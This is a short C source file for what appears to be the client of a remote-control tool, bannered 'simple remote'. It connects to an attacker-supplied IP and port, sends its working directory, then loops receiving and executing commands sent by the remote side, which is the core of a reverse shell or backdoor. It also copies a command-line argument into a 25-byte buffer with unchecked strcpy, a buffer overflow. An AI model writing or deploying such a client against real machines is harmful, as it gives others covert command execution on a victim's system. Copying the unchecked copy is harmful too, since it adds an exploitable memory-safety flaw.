#include "socket.h"
#include "command.h"


// 客户端

// 指定发送地址
char ip[25];

int main(int argc, char* argv[])
{
	printf("     _                 _                                 _       \n");
	printf(" ___(_)_ __ ___  _ __ | | ___   _ __ ___ _ __ ___   ___ | |_ ___ \n");
	printf("/ __| | '_ ` _ \\| '_ \\| |/ _ \\ | '__/ _ \\ '_ ` _ \\ / _ \\| __/ _ \\\n");
	printf("\\__ \\ | | | | | | |_) | |  __/ | | |  __/ | | | | | (_) | ||  __/\n");
	printf("|___/_|_| |_| |_| .__/|_|\\___| |_|  \\___|_| |_| |_|\\___/ \\__\\___|\n");
	printf("                |_|                                              \n");
	printf("\n");
	printf("          =[ author 麦当 v1.0                                   ]\n");
	// 初始化ip
	ZeroMemory(ip, sizeof(ip));
	strcpy(ip,argv[1]);
	// 指定发送端口
	int port = atoi(argv[2]);
	// 执行的命令
	char cmd[255] = { 0 };
	// 初始化sock
	InitSock();
	// 建立连接
	SOCKET sServer = Connect(ip, port);
	//引入随机数种子
	srand((unsigned int)time(NULL));

	while (TRUE)
	{
		// 发送当前路径
		SendPath(sServer);

		// 获取cmd命令
		RecvData(sServer, cmd, sizeof(cmd));
		printf("recv cmd is %s\n", cmd);

		// 执行命令
		ExecCmd(sServer, cmd);
		ZeroMemory(cmd, sizeof(cmd));
	}
	// 关闭套接字
	closesocket(sServer);
	// 清理
	WSACleanup();

	return 0;
}